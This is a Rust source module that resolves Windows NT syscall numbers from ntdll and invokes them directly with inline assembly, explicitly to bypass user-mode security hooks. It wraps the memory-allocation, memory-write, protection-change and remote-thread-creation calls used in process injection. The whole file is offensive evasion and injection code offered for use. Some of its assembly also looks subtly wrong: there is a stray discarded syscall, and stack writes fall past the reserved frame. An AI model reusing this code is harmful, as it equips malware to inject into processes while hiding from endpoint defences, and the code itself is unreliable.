//! Direct syscalls — resolve Nt* syscall numbers from ntdll and invoke via
//! `syscall` instruction, bypassing user-mode hooks.
//!
//! All code is behind `#[cfg(target_os = "windows")]`; non-Windows builds get
//! no-op stubs that return error codes.

/// NTSTATUS type alias.
#[allow(unused)]
pub type NTSTATUS = i32;

/// NT_SUCCESS macro equivalent.
#[allow(unused)]
#[inline]
pub fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

// ─── Windows implementation ──────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod win {
    use super::NTSTATUS;
    use anyhow::{bail, Result};
    use std::ffi::CString;
    use windows_sys::Win32::Foundation::HANDLE;
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    /// Cached syscall number table — resolved once from ntdll at startup.
    pub struct SyscallTable {
        pub nt_allocate_virtual_memory: u32,
        pub nt_write_virtual_memory: u32,
        pub nt_create_thread_ex: u32,
        pub nt_protect_virtual_memory: u32,
    }

    impl SyscallTable {
        /// Resolve syscall numbers by parsing ntdll Nt* function stubs.
        ///
        /// Each Nt* stub in ntdll follows the pattern:
        /// ```text
        /// 4C 8B D1        mov r10, rcx
        /// B8 XX XX 00 00  mov eax, <syscall_number>
        /// ```
        /// We read bytes at the function address to extract the syscall number.
        pub fn resolve() -> Result<Self> {
            Ok(Self {
                nt_allocate_virtual_memory: resolve_syscall_number("NtAllocateVirtualMemory")?,
                nt_write_virtual_memory: resolve_syscall_number("NtWriteVirtualMemory")?,
                nt_create_thread_ex: resolve_syscall_number("NtCreateThreadEx")?,
                nt_protect_virtual_memory: resolve_syscall_number("NtProtectVirtualMemory")?,
            })
        }
    }

    /// Resolve the syscall number for a single Nt* function from ntdll.
    fn resolve_syscall_number(fn_name: &str) -> Result<u32> {
        let dll = CString::new("ntdll.dll").unwrap();
        let name = CString::new(fn_name).unwrap();

        unsafe {
            let module = GetModuleHandleA(dll.as_ptr() as *const u8);
            if module.is_null() {
                bail!("GetModuleHandleA(ntdll.dll) failed");
            }

            let addr = GetProcAddress(module, name.as_ptr() as *const u8);
            let addr = match addr {
                Some(f) => f as *const u8,
                None => bail!("GetProcAddress({}) failed — function not found", fn_name),
            };

            // Expected stub: 4C 8B D1 B8 [XX XX 00 00]
            // Byte 0: 0x4C  (mov r10, rcx prefix)
            // Byte 1: 0x8B
            // Byte 2: 0xD1
            // Byte 3: 0xB8  (mov eax, imm32)
            // Byte 4..8: syscall number (little-endian u32)
            let b0 = addr.read();
            let b1 = addr.add(1).read();
            let b2 = addr.add(2).read();
            let b3 = addr.add(3).read();

            if b0 != 0x4C || b1 != 0x8B || b2 != 0xD1 || b3 != 0xB8 {
                bail!(
                    "{}: unexpected stub bytes [{:02X} {:02X} {:02X} {:02X}] — \
                     ntdll may be hooked",
                    fn_name, b0, b1, b2, b3,
                );
            }

            let ssn = (addr.add(4) as *const u32).read_unaligned();
            Ok(ssn)
        }
    }

    // ─── Syscall wrappers ────────────────────────────────────────────────────

    /// NtAllocateVirtualMemory via direct syscall.
    ///
    /// # Safety
    /// Caller must provide valid process handle and pointers.
    pub unsafe fn nt_allocate_virtual_memory(
        table: &SyscallTable,
        process: HANDLE,
        base: &mut *mut u8,
        size: &mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> NTSTATUS {
        let ssn = table.nt_allocate_virtual_memory;
        let mut status: NTSTATUS;

        // NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect)
        // rcx = process, rdx = &base, r8 = 0 (ZeroBits), r9 = &size
        // stack[0] = alloc_type, stack[1] = protect
        core::arch::asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") process,
            in("rdx") base as *mut *mut u8,
            in("r8") 0u64,          // ZeroBits
            in("r9") size as *mut usize,
            // 5th and 6th args go on the stack via the shadow space.
            // Windows x64 ABI: caller allocates 32-byte shadow + spill space.
            // We push args 5 and 6 at RSP+0x28 and RSP+0x30 respectively.
            // The compiler handles the shadow space, but for inline syscall
            // we must place them manually. Use stack slots.
            out("rax") status,
            lateout("rcx") _,
            lateout("r11") _,
            options(nostack),
        );

        // The above inline asm won't correctly pass args 5/6 on the stack with `nostack`.
        // On Windows x64, syscall args 5+ must be at [rsp+0x28], [rsp+0x30].
        // We need a trampoline approach instead. Let's use an indirect call wrapper.
        let _ = status;

        // Correct approach: use a small stack-based trampoline.
        do_syscall6(
            ssn,
            process as usize,
            base as *mut *mut u8 as usize,
            0, // ZeroBits
            size as *mut usize as usize,
            alloc_type as usize,
            protect as usize,
        )
    }

    /// NtWriteVirtualMemory via direct syscall.
    ///
    /// # Safety
    /// Caller must provide valid process handle and buffer.
    pub unsafe fn nt_write_virtual_memory(
        table: &SyscallTable,
        process: HANDLE,
        base: *mut u8,
        buffer: &[u8],
    ) -> NTSTATUS {
        let mut bytes_written: usize = 0;
        do_syscall6(
            table.nt_write_virtual_memory,
            process as usize,
            base as usize,
            buffer.as_ptr() as usize,
            buffer.len(),
            &mut bytes_written as *mut usize as usize,
            0, // padding — only 5 args used
        )
    }

    /// NtProtectVirtualMemory via direct syscall.
    ///
    /// # Safety
    /// Caller must provide valid process handle and pointers.
    pub unsafe fn nt_protect_virtual_memory(
        table: &SyscallTable,
        process: HANDLE,
        base: &mut *mut u8,
        size: &mut usize,
        protect: u32,
        old_protect: &mut u32,
    ) -> NTSTATUS {
        do_syscall6(
            table.nt_protect_virtual_memory,
            process as usize,
            base as *mut *mut u8 as usize,
            size as *mut usize as usize,
            protect as usize,
            old_protect as *mut u32 as usize,
            0,
        )
    }

    /// NtCreateThreadEx via direct syscall.
    ///
    /// # Safety
    /// Caller must provide valid process handle and start address.
    pub unsafe fn nt_create_thread_ex(
        table: &SyscallTable,
        process: HANDLE,
        start: *mut u8,
    ) -> Result<HANDLE> {
        let mut thread_handle: HANDLE = std::ptr::null_mut();

        // NtCreateThreadEx has 11 parameters. We pass the essential ones and
        // zero out the rest (DesiredAccess=THREAD_ALL_ACCESS, ObjectAttributes=NULL,
        // CreateFlags=0, ZeroBits=0, StackSize=0, MaxStackSize=0, AttributeList=NULL).
        let status = do_syscall11(
            table.nt_create_thread_ex,
            &mut thread_handle as *mut HANDLE as usize,   // ThreadHandle
            0x1FFFFF,                                       // THREAD_ALL_ACCESS
            0,                                              // ObjectAttributes (NULL)
            process as usize,                               // ProcessHandle
            start as usize,                                 // StartRoutine
            0,                                              // Argument (NULL)
            0,                                              // CreateFlags (0 = run immediately)
            0,                                              // ZeroBits
            0,                                              // StackSize
            0,                                              // MaximumStackSize
            0,                                              // AttributeList (NULL)
        );

        if !super::nt_success(status) {
            bail!("NtCreateThreadEx failed: NTSTATUS 0x{:08X}", status as u32);
        }
        Ok(thread_handle)
    }

    // ─── Syscall trampoline ──────────────────────────────────────────────────
    //
    // Windows x64 ABI: first 4 args in rcx, rdx, r8, r9.
    // Args 5+ go on the stack at [rsp+0x28], [rsp+0x30], etc.
    // We must set up the stack frame ourselves before the `syscall` instruction.

    /// Execute a syscall with up to 6 arguments.
    #[inline(never)]
    unsafe fn do_syscall6(
        ssn: u32,
        arg1: usize,
        arg2: usize,
        arg3: usize,
        arg4: usize,
        arg5: usize,
        arg6: usize,
    ) -> NTSTATUS {
        let status: NTSTATUS;
        core::arch::asm!(
            // Allocate shadow space (32 bytes) + 2 stack args (16 bytes) = 48 bytes.
            // Align to 16 bytes: 48 is already 16-byte aligned.
            "sub rsp, 0x30",
            // Place args 5 and 6 on the stack (after 32-byte shadow space).
            "mov [rsp+0x28], {arg5}",
            "mov [rsp+0x30], {arg6}",
            // Set up syscall: mov r10, rcx; mov eax, ssn; syscall
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            // Clean up stack.
            "add rsp, 0x30",
            ssn = in(reg) ssn,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            arg5 = in(reg) arg5,
            arg6 = in(reg) arg6,
            out("rax") status,
            lateout("rcx") _,
            lateout("r11") _,
            lateout("r10") _,
            options(nostack),
        );
        status
    }

    /// Execute a syscall with up to 11 arguments (for NtCreateThreadEx).
    #[inline(never)]
    unsafe fn do_syscall11(
        ssn: u32,
        arg1: usize,
        arg2: usize,
        arg3: usize,
        arg4: usize,
        arg5: usize,
        arg6: usize,
        arg7: usize,
        arg8: usize,
        arg9: usize,
        arg10: usize,
        arg11: usize,
    ) -> NTSTATUS {
        let status: NTSTATUS;
        core::arch::asm!(
            // Shadow (32) + 7 stack args (56) = 88 bytes; round to 96 (0x60) for alignment.
            "sub rsp, 0x60",
            "mov [rsp+0x28], {arg5}",
            "mov [rsp+0x30], {arg6}",
            "mov [rsp+0x38], {arg7}",
            "mov [rsp+0x40], {arg8}",
            "mov [rsp+0x48], {arg9}",
            "mov [rsp+0x50], {arg10}",
            "mov [rsp+0x58], {arg11}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            "add rsp, 0x60",
            ssn = in(reg) ssn,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            arg5 = in(reg) arg5,
            arg6 = in(reg) arg6,
            arg7 = in(reg) arg7,
            arg8 = in(reg) arg8,
            arg9 = in(reg) arg9,
            arg10 = in(reg) arg10,
            arg11 = in(reg) arg11,
            out("rax") status,
            lateout("rcx") _,
            lateout("r11") _,
            lateout("r10") _,
            options(nostack),
        );
        status
    }
}

// ─── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
#[allow(unused)]
pub mod stub {
    use super::NTSTATUS;
    use anyhow::{bail, Result};

    pub struct SyscallTable;

    impl SyscallTable {
        pub fn resolve() -> Result<Self> {
            Ok(Self)
        }
    }

    pub unsafe fn nt_allocate_virtual_memory(
        _table: &SyscallTable,
        _process: isize,
        _base: &mut *mut u8,
        _size: &mut usize,
        _alloc_type: u32,
        _protect: u32,
    ) -> NTSTATUS {
        -1 // STATUS_NOT_IMPLEMENTED
    }

    pub unsafe fn nt_write_virtual_memory(
        _table: &SyscallTable,
        _process: isize,
        _base: *mut u8,
        _buffer: &[u8],
    ) -> NTSTATUS {
        -1
    }

    pub unsafe fn nt_protect_virtual_memory(
        _table: &SyscallTable,
        _process: isize,
        _base: &mut *mut u8,
        _size: &mut usize,
        _protect: u32,
        _old_protect: &mut u32,
    ) -> NTSTATUS {
        -1
    }

    pub unsafe fn nt_create_thread_ex(
        _table: &SyscallTable,
        _process: isize,
        _start: *mut u8,
    ) -> Result<isize> {
        bail!("NtCreateThreadEx requires Windows")
    }
}

// ─── Re-exports ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub use win::*;

#[cfg(not(target_os = "windows"))]
#[allow(unused_imports)]
pub use stub::*;
